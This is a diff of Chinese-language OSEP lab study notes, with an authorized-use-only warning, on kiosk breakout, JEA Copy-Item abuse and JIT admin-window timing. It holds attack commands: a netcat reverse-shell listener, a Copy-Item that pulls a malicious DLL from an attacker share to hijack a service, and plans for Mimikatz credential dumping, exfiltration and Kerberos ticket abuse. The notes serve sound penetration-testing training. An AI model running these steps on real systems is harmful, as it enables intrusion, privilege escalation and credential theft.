@@ -1,16 +1,12 @@
-::: warning Authorized use only
-For the official OSEP labs/exam, or systems you are written-authorized to test. Do not use against unauthorized systems.
+::: warning 仅限授权使用
+本笔记仅用于 OSEP 官方实验 / 考试环境，或已获得书面授权的测试。禁止对未授权系统使用。
 :::
 
-# Module 14 — Kiosk / JEA / JIT
+# 14 · 场景 41–43：Kiosk 突破 · JEA 越权文件复制 · JIT 时间窗
 
-Dialog escape, over-broad Copy-Item, short admin windows.
-
-Switch to **中文** in the header for the original full narrative. Lab listings on this page are complete.
-
-> 依据说明：本主题在  中没有直接条目，以下内容按教材第 16 章（受限桌面 / Kiosk 突破）与第 23 章（PowerShell 受限端点 JEA 与临时授权 JIT）的实验思路整理，并补充通用枚举与Verify方法。
+> 依据说明：本主题在  中没有直接条目，以下内容按教材第 16 章（受限桌面 / Kiosk 突破）与第 23 章（PowerShell 受限端点 JEA 与临时授权 JIT）的实验思路整理，并补充通用枚举与验证方法。
 > 行文约定：中文说明 + 英文命令；占位符统一为 `LHOST` `LPORT` `TARGET` `DOMAIN` `USER` `PASS` `NTHASH` `PAYLOAD` `URL`。
-> 本模块文件：[14-kiosk-jea-jit](/modules/14-kiosk-jea-jit)、`m14-jea-file-copy.ps1`、`m14-jea-service-dll.cs`、`m14-jit-admin-window.ps1`、`m14-kiosk-breakout.md`。
+> 本模块文件：[14-kiosk-jea-jit](/zh/modules/14-kiosk-jea-jit)、`m14-jea-file-copy.ps1`、`m14-jea-service-dll.cs`、`m14-jit-admin-window.ps1`、`m14-kiosk-breakout.md`。
 
 ## 0. 场景总览
 
@@ -24,18 +20,18 @@ Switch to **中文** in the header for the original full narrative. Lab listings
 
 ---
 
-## Scenario 41 · Kiosk 突破路径清单
+## 场景 41 · Kiosk 突破路径清单
 
-### Scenario回顾
-target以“单应用 Kiosk”形态运行：Windows 外壳被替换或用 Assigned Access 锁定到某个应用（浏览器、自研程序、PDF 阅读器等）。我们能与之交互（物理终端或 RDP），但开始菜单、Win+R、任务管理器、直接开 cmd/PowerShell 均不可用或被策略移除。任务：找出至少一条路径拿到**命令执行**。突破通常先落在 kiosk 用户身份（普通权限），后续提权/横向走常规流程（见 M06/M07）。
+### 场景回顾
+目标机以“单应用 Kiosk”形态运行：Windows 外壳被替换或用 Assigned Access 锁定到某个应用（浏览器、自研程序、PDF 阅读器等）。我们能与之交互（物理终端或 RDP），但开始菜单、Win+R、任务管理器、直接开 cmd/PowerShell 均不可用或被策略移除。任务：找出至少一条路径拿到**命令执行**。突破通常先落在 kiosk 用户身份（普通权限），后续提权/横向走常规流程（见 M06/M07）。
 
 ### 前提与假设
 - kiosk 用户是普通域/本地用户，不含管理员权限——突破后预期先得到低权 shell。
 - 不假设“所有系统通道都封了”：很多 kiosk 只锁表面入口（外壳/开始菜单），深层对话框通道（打开/另存为/打印/帮助）经常没封。
 - RDP 进入后若 kiosk 应用崩溃或可被关闭（Alt+F4）而退到桌面，等于直接拿到桌面——先试探外壳状态，别急着打洞。
-- 需要最终能回连attacker box（`LHOST` 对 kiosk 可达）或能把命令结果带出来。
+- 需要最终能回连攻击机（`LHOST` 对 kiosk 可达）或能把命令结果带出来。
 
-### 准备（attacker box侧）
+### 准备（攻击机侧）
 - 起监听：`nc -lvnp LPORT`，或 C2 listener。
 - 备好二阶段 `PAYLOAD`（PowerShell 一行或可执行文件），并记录可投递的 `URL`（HTTP/SMB）。
 - 手边放路径清单速查 `m14-kiosk-breakout.md`，逐项勾选。
@@ -53,15 +49,15 @@ target以“单应用 Kiosk”形态运行：Windows 外壳被替换或用 Assig
 5. **帮助系统**：应用“帮助”若以 .chm 打开（hh.exe 窗口），CHM 内“跳转 URL/快捷方式”可指到外部程序；若帮助在浏览器打开 → 回到第 2 条。
 6. **辅助功能 / 输入法**：Win+U 可用则弹“轻松使用”，其链接（讲述人/屏幕键盘）有时能带出系统界面；屏幕键盘上常有 Win 键虚拟按键。
 7. **任务管理器通道**：Ctrl+Shift+Esc → 文件 → 运行新任务 → 输入 `cmd`。若弹 UAC 说明该操作在请求提权，换用户级通道（任务管理器“运行新任务”对当前用户不总是提权，值得试）。
-8. **拿到命令执行后立刻固化现场**：把通道和复现步骤写进清单，然后弹回 shell（见Verify），避免反复进出。
+8. **拿到命令执行后立刻固化现场**：把通道和复现步骤写进清单，然后弹回 shell（见验证），避免反复进出。
 
 ### 用到的脚本
 - `m14-kiosk-breakout.md`：分通道的路径清单速查，含每条“可用信号 / 被封特征 / 备注”，用于现场逐项勾选。
 
-### Verify
+### 验证
 - 出现回连：`nc -lvnp LPORT` 收到连接；或命令回显可见。
 - 在 shell 里确认身份与网络：`whoami`（应为 kiosk 用户）、`ipconfig`、`netstat -ano`、`cmdkey /list`、`dir %APPDATA%\Microsoft\Credentials`。
-- 若只是拿到“对话框内文件系统访问”而非完整 shell，Verify标准是“能否稳定复现且不打断 kiosk 业务”。
+- 若只是拿到“对话框内文件系统访问”而非完整 shell，验证标准是“能否稳定复现且不打断 kiosk 业务”。
 - 记录完整性级别：`whoami /groups | findstr /i "完整性 强制"`——判断下一步是提权还是可直接横向。
 
 ### 失败分支与备选
@@ -258,9 +254,9 @@ dir %APPDATA%\Microsoft\Credentials
 - 保持清单勾选记录：报告里要能说清"哪条通道通的、哪些被封、如何复现"。
 ````
 
-## Scenario 42 · JEA 过宽文件复制 + 服务加载触发
+## 场景 42 · JEA 过宽文件复制 + 服务加载触发
 
-### Scenario回顾
+### 场景回顾
 域内存在 PowerShell 受限端点（JEA，登录时用 `-ConfigurationName` 指定会话配置，如 `BackupMaintenance`）。我们控制的低权账户是某 JEA 角色的成员，该角色能力（Role Capability）**过宽**：允许 `Copy-Item` 且 `-Destination` 未被限制在安全目录（可写到服务目录等），或额外允许对指定服务 `Restart-Service`。能力白名单不包含任意命令执行，所以不能直接在 JEA 会话里跑代码。攻击思路：用文件复制把恶意 DLL 放到**服务/守护进程会从该目录加载 DLL**的位置（目录内“缺的依赖 DLL”或插件 DLL），再触发加载，让代码以服务账户上下文执行。
 
 ### 前提与假设
@@ -269,7 +265,7 @@ dir %APPDATA%\Microsoft\Credentials
 - 至少有一种触发手段：角色允许 `Restart-Service`/`Stop-Service`+`Start-Service`；或服务会周期自动重启；或管理员会手动重启该服务。
 - JEA 会话以虚拟账户/托管服务账户运行，落盘受该账户权限约束——能越权写到服务目录正是“能力过宽”的体现。
 
-### 准备（attacker box侧）
+### 准备（攻击机侧）
 - 准备恶意 DLL：`m14-jea-service-dll.cs`（或按目标缺的依赖类型改用 M04 的 C 原生 DLL 模板）。
 - 起监听：`nc -lvnp LPORT`；确认 `LHOST` 对 `TARGET` 的 5985/5986 可达。
 - 尽量先弄清目标服务 exe 的真实缺失依赖名与架构（x64/x86）——侧加载 DLL 的**文件名与架构必须匹配宿主**。
@@ -280,27 +276,27 @@ dir %APPDATA%\Microsoft\Credentials
 2. **构造凭据并连接 JEA 端点**：
    `$cred = Get-Credential DOMAIN\USER`；`Enter-PSSession -ComputerName TARGET -ConfigurationName <JEA端点> -Credential $cred`
    （NTHASH 无明文时，WinRM 直连不支持哈希，改用 `m15` 的 evil-winrm/PowerShell 哈希登录模板；或先把 NTHASH 换票。）
-3. **枚举会话内可用命令**：`Get-Command | Select-Object Name, Source`——JEA 会隐藏未允许的命令，**能看到的就是能用的**。确认 `Copy-Item` 在列；`Restart-Service`/`Test-Path` 是否在列决定触发与Verify策略。
+3. **枚举会话内可用命令**：`Get-Command | Select-Object Name, Source`——JEA 会隐藏未允许的命令，**能看到的就是能用的**。确认 `Copy-Item` 在列；`Restart-Service`/`Test-Path` 是否在列决定触发与验证策略。
 4. **探边界（无害文件）**：`Copy-Item C:\Windows\Temp\probe.txt -Destination <候选目录>\m14probe.txt`。成功/报错信息用于判断该目录是否在复制能力内（报 Access Denied/路径被排除 → 换目录）。
-5. **确定目标服务与 DLL 名**：若能列出服务（`Get-Service` 在白名单内则直接列）；否则结合target已知软件判断。要点：**投放文件名必须是宿主缺的依赖或会加载的插件名**，架构匹配。
-6. **投放恶意 DLL**：`Copy-Item \\LHOST\share\evil.dll -Destination "<服务目录>\<缺的依赖名>.dll" -Force`（先把原 DLL 备份副本留attacker box侧，便于事后恢复）。
+5. **确定目标服务与 DLL 名**：若能列出服务（`Get-Service` 在白名单内则直接列）；否则结合目标机已知软件判断。要点：**投放文件名必须是宿主缺的依赖或会加载的插件名**，架构匹配。
+6. **投放恶意 DLL**：`Copy-Item \\LHOST\share\evil.dll -Destination "<服务目录>\<缺的依赖名>.dll" -Force`（先把原 DLL 备份副本留攻击机侧，便于事后恢复）。
 7. **触发加载**：
    - 角色允许：`Restart-Service <服务名>`（先 `Stop-Service` 再 `Start-Service` 也试一下，有的能力只放行其一）。
    - 不允许服务控制：等待服务自动重启/管理员操作，监听保持在线、持久化提前备好。
 8. **回收与清理**：shell 回连后 `whoami` 应为服务账户；核对监听日志与 DLL 行为后，按需恢复被覆盖文件。
 
 ### 用到的脚本
-- `m14-jea-file-copy.ps1`：从attacker box自动化第 2、4、6、7 步（构造凭据 → 进 JEA 会话 → 枚举命令 → 无害探边界 → 投放 → 触发），每步输出结果。
+- `m14-jea-file-copy.ps1`：从攻击机自动化第 2、4、6、7 步（构造凭据 → 进 JEA 会话 → 枚举命令 → 无害探边界 → 投放 → 触发），每步输出结果。
 - `m14-jea-service-dll.cs`：被投放的 DLL 载荷模板（加载即回连/执行命令两种模式，含编译路线说明）。
 
-### Verify
+### 验证
 - 会话内 `Get-Command` 能看到 `Copy-Item` 等白名单命令 → 端点可达、能力符合预期。
 - 探路文件确实写入目标目录（会话内若允许 `Test-Path` 直接验；否则用第二步 Copy-Item 覆盖同名文件看是否报“已存在/被占用”间接判断）。
 - 触发后监听器收到回连，`whoami` 为服务账户 → 端到端成功。
 
 ### 失败分支与备选
 - **`-Destination` 实际被限制**（报错/被排除）：设法读角色能力文件定位允许路径——`C:\Program Files\WindowsPowerShell\Modules\<模块>\<角色能力>\*.psrc` 的 `FileSystem` 段（若能读）；或改投“共享根目录 + 目标服务把共享当模块/配置目录加载”的组合。
-- **服务不加载放进去的 DLL**（名字或依赖猜错）：先在attacker box用 dumpbin/ProcMon 思路确认服务 exe 导入表缺哪个 DLL；无 ProcMon 时查同版本软件的“已知可侧加载 DLL 名”清单（如 `version.dll`、`winmm.dll` 类）。
+- **服务不加载放进去的 DLL**（名字或依赖猜错）：先在攻击机用 dumpbin/ProcMon 思路确认服务 exe 导入表缺哪个 DLL；无 ProcMon 时查同版本软件的“已知可侧加载 DLL 名”清单（如 `version.dll`、`winmm.dll` 类）。
 - **没有任何服务控制命令且服务不会自动重启**：文件复制能力可换触发对象——覆盖可写位置的登录脚本、计划任务脚本、`Startup` 快捷方式、被周期执行的配置文件，把“服务触发”改成“事件触发”（用户登录/计划任务）。
 - **服务上下文是 NetworkService/LocalService 而非 SYSTEM**：接受该上下文做横向，或换一个以 SYSTEM 运行的服务目标。
 
@@ -748,18 +744,18 @@ Write-Step "完成。若 DLL 回连成功请核对 whoami（应为服务账户�
 Remove-PSSession $session
 ````
 
-## Scenario 43 · JIT 时间窗（授权状态 / 令牌刷新时间差 / 窗口内既定命令）
+## 场景 43 · JIT 时间窗（授权状态 / 令牌刷新时间差 / 窗口内既定命令）
 
-### Scenario回顾
-环境对管理员权限实施 Just-In-Time（JIT）：平时高权组（如域组 `JIT-Admins`，或target本地管理员组）里**没有**目标账户；管理员需要时临时把账户加进组，几分钟到几十分钟后自动移除。我们持有某低权账户凭据，且该账户可能被 JIT 授权（或能接管一个会被授权的账户）。任务：利用**时间窗**拿到高权结果。核心是三点：① 能查询授权状态（何时进窗/出窗）；② 理解令牌刷新时间差（“组被加了”≠“现有会话立刻生效”，反之“组被移除”≠“已签发票据立即失效”）；③ 把窗口内要执行的**高权命令预先编排好**，进窗即跑，不能现场想。
+### 场景回顾
+环境对管理员权限实施 Just-In-Time（JIT）：平时高权组（如域组 `JIT-Admins`，或目标机本地管理员组）里**没有**目标账户；管理员需要时临时把账户加进组，几分钟到几十分钟后自动移除。我们持有某低权账户凭据，且该账户可能被 JIT 授权（或能接管一个会被授权的账户）。任务：利用**时间窗**拿到高权结果。核心是三点：① 能查询授权状态（何时进窗/出窗）；② 理解令牌刷新时间差（“组被加了”≠“现有会话立刻生效”，反之“组被移除”≠“已签发票据立即失效”）；③ 把窗口内要执行的**高权命令预先编排好**，进窗即跑，不能现场想。
 
 ### 前提与假设
 - 持有会被 JIT 授权的低权账户凭据；或能先接管 JIT 授权对象账户。
 - 至少一条“看窗”途径：能读 AD（LDAP 组成员查询）、能读域控/本机安全日志（4728/4729：组成员增/删）、或环境文档写明 JIT 激活规则与时长。
 - Kerberos 为主认证：TGT/服务票据有生命周期，**组 SID 只打进签发时刻的票据**——这是时间差能被利用的根因。
-- attacker box与域控时间已同步（Kerberos 硬性要求）。
+- 攻击机与域控时间已同步（Kerberos 硬性要求）。
 
-### 准备（attacker box侧）
+### 准备（攻击机侧）
 - 预编排窗口内命令清单并排好顺序（见执行步骤 4），因为窗口可能只有几分钟。
 - 准备监听与需要落地的持久化/抓取脚本。
 - 记录 JIT 预期窗口起止与轮询起点，便于回溯。
@@ -773,26 +769,26 @@ Remove-PSSession $session
    - **进窗侧**：窗口前已存在的旧会话/旧令牌不含新加的组 SID（`whoami /groups` 看不到）——必须**在窗口内取新令牌**：重新登录、`runas`、新建 PSSession（触发新网络登录 → 新 TGT 带当前组 SID）、或 `klist purge` 后重新获取票据。
    - **出窗侧**：窗口内签发的 Kerberos 票据生命周期（默认 TGT 10h，可续期最长 7 天）**长于组成员资格**——组被移除后，票据里的高权 SID 仍有效直到票据过期/被吊销。续期（renew）只延长时间、不改变 SID 集合。
 3. **部署窗口监听**：后台轮询授权状态（`m14-jit-admin-window.ps1`）。检测到进窗后立即：
-   a. 取新令牌（新建 PSSession / runas / 重新认证到target）；
+   a. 取新令牌（新建 PSSession / runas / 重新认证到目标机）；
    b. 校验新令牌含高权组：会话内 `whoami /groups | findstr JIT`；
    c. 顺序执行预置命令清单。
 4. **窗口内既定命令清单**（按顺序预排、每条尽量短）：
-   1) 抓取本机/域高权凭据并回传（Invoke-Mimikatz 等，见 M07）——结果落attacker box，出窗后可继续用；
+   1) 抓取本机/域高权凭据并回传（Invoke-Mimikatz 等，见 M07）——结果落攻击机，出窗后可继续用；
    2) 读取需要高权的文件/配置（脚本、备份、注册表）并外传；
    3) （可选，放最后）建持久化：计划任务/服务/把我们的账户加进长期组——改变环境的动作单独确认、评估审计风险。
    原则：**先拿结果再谈持久化**；拿到的票据/哈希/远程会话是“窗后可继续用”的资产。
-5. **窗口结束后的利用**：轮询发现成员被移除（出窗）后，Verify残余会话/票据是否仍带高权 SID（既有 PSSession 的令牌是登录快照，理论上仍含该组）；在票据生命周期内完成横向，不依赖组成员资格本身。
+5. **窗口结束后的利用**：轮询发现成员被移除（出窗）后，验证残余会话/票据是否仍带高权 SID（既有 PSSession 的令牌是登录快照，理论上仍含该组）；在票据生命周期内完成横向，不依赖组成员资格本身。
 
 ### 用到的脚本
 - `m14-jit-admin-window.ps1`：轮询授权状态（ADSI 组成员查询为主，本地组/事件日志模式可选）→ 进窗即取新令牌 → 执行预置命令清单 → 记录出窗时间并检查残余令牌状态。
 
-### Verify
+### 验证
 - 脚本日志顺序完整：检测进窗 → 新令牌含 JIT 组 → 命令清单逐条成功 → 检测出窗 → 残余令牌检查结果。
-- 三态Verify：窗内新令牌 `whoami /groups` 含高权组；窗外旧进程令牌不含；窗内建起的 PSSession 出窗后仍可用（登录快照）。
-- 清单产物（哈希文件/抓取结果/票据文件）在attacker box侧确认存在。
+- 三态验证：窗内新令牌 `whoami /groups` 含高权组；窗外旧进程令牌不含；窗内建起的 PSSession 出窗后仍可用（登录快照）。
+- 清单产物（哈希文件/抓取结果/票据文件）在攻击机侧确认存在。
 
 ### 失败分支与备选
-- **无法读组成员/事件日志**：按环境文档的 JIT 激活时刻提前蹲守，窗口起点附近高频尝试取新令牌并用 `whoami /groups` Verify（穷举窗口起点）；或观察管理员触发授权的行为规律推断时刻。
+- **无法读组成员/事件日志**：按环境文档的 JIT 激活时刻提前蹲守，窗口起点附近高频尝试取新令牌并用 `whoami /groups` 验证（穷举窗口起点）；或观察管理员触发授权的行为规律推断时刻。
 - **被授权对象不是我们掌握的账户**：先接管/复用 JIT 授权账户（凭据、会话、令牌），再回到本流程。
 - **出窗后残余票据立即失效**（JIT 配了短 TGT 或强制注销）：放弃窗口后利用，把产出集中在窗口内（回连/落库优先）。
 - **高权组只对“新交互登录”生效但环境禁多会话/runas**：在窗口内用 S4U 直接申请服务票据（Rubeus `s4u`/`asktgt` 思路），绕过交互登录限制，把高权 SID 固化进可用的票据。
@@ -801,7 +797,7 @@ Remove-PSSession $session
 - 授权状态轮询是低危读操作，但高频轮询留大量 LDAP 查询日志：间隔 ≥5–10s，只在预期窗口前后加密频率。
 - 事件日志查询（4728/4729）尽量只查域控，不要横向扫多台机器。
 - 窗口内抓凭据/建持久化会被记入 JIT 会话审计：窗口内优先做“拿结果”（抓哈希/外传文件），持久化动作减到最少并放最后。
-- 残余票据别用到过期前一秒（续期失败/被吊销现场难收拾）；Verify一次可行即转入正式利用，尽快落库。
+- 残余票据别用到过期前一秒（续期失败/被吊销现场难收拾）；验证一次可行即转入正式利用，尽快落库。
 
 #### `m14-jit-admin-window.ps1` {#m14-jit-admin-window-ps1}
 
